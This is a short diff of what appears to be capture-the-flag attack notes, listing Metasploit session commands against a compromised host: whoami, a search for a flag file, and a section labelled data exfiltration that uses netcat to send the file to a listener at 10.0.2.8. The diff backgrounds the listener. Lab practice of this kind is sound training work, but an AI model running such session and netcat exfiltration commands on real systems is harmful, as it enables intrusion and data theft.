@@ -50,7 +50,7 @@ run -j
 sessions -i Y -c 'whoami'
 sessions -i Y -c 'find / -name 3_of_hearts.png'
 ##-m DATA EXFIL
-nc -l -p 1234 > 3_of_hearts.png
+nc -l -p 1234 > 3_of_hearts.png &
 sessions -i Y -c 'nc 10.0.2.8 1234 < /lost+found/3_of_hearts.png' 
 
 
